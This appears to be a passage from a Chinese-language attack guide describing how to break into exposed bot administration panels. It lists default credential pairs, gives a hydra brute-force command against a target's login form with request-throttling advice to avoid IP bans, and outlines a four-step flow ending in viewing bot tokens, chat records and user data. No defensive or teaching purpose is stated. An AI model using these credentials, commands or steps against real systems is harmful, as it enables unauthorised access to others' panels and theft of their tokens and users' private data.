## 第 2 步: 手动弱口令(先手动后字典)

```
手动先试(至少 30% 面板直接进):
  admin/admin  admin/123456  admin/password  root/root
  admin/admin123  test/test  空/空

字典爆破(hydra):
  hydra -L user.txt -P pass.txt 目标IP http-post-form \
    "/login:user=^USER^&pass=^PASS^:F=错误"
  # 间隔 2-3 秒一个请求, 一秒几十发会被封 IP
```

**4 步流程**: ①搜语法找面板 → ②确认是 Bot 管理后台 → ③手动弱口令(5 分钟)→ ④看 Bot Token/聊天记录/用户数据

